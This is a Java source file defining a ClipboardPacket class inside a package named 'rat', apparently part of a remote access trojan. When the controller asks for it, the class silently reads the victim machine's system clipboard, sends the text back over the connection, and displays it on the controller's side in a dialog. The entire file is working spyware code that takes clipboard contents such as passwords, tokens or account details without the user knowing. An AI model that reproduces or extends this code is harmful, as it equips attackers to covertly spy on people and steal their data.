package de.sogomn.rat.packet;

import java.awt.HeadlessException;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;

import javax.swing.JDialog;
import javax.swing.JOptionPane;

import de.sogomn.rat.ActiveConnection;

public final class ClipboardPacket extends AbstractPingPongPacket {
	
	private String clipboardContent;
	
	public ClipboardPacket() {
		type = REQUEST;
		clipboardContent = "";
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		connection.writeUTF(clipboardContent);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		clipboardContent = connection.readUTF();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		type = DATA;
		
		try {
			final Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
			final Object clipboardObject = clipboard.getData(DataFlavor.stringFlavor);
			
			if (clipboardObject != null) {
				clipboardContent = (String)clipboardObject;
			}
		} catch (final HeadlessException | UnsupportedFlavorException | IOException ex) {
			clipboardContent = "";
		}
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		final JOptionPane optionPane = new JOptionPane(clipboardContent);
		final JDialog dialog = optionPane.createDialog(null);
		
		dialog.setModal(false);
		dialog.setVisible(true);
	}
	
	public String getClipbordContent() {
		return clipboardContent;
	}
	
}
